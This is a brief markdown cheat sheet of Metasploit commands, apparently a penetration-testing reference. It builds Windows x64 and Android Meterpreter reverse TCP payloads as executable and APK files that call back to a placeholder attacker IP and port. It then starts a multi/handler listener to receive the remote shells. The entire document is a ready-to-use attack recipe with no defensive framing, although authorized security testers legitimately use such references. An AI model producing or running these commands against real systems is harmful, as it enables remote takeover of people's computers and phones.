### Windows reverse TCP Meterpreter

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attack_ip> LPORT=<attack_port> -f exe-only --platform windows --arch x64 > reverse.exe
```

### Android reverse TCP Meterpreter

```
msfvenom -p android/meterpreter/reverse_tcp LHOST=<attack_ip> LPORT=<attack_port> --platform android > reverse.apk
```

### Reverse TCP listener

_This example is for Windows reverse TCP. Switch the payload for the appropriate server_

```
$ msfconsole
> use exploit/multi/handler
> set payload windows/x64/meterpreter/reverse_tcp
> set LHOST <attack_ip>
> set LPORT 4444
> exploit
```

_Use `exploit -j` to start the listener in the background_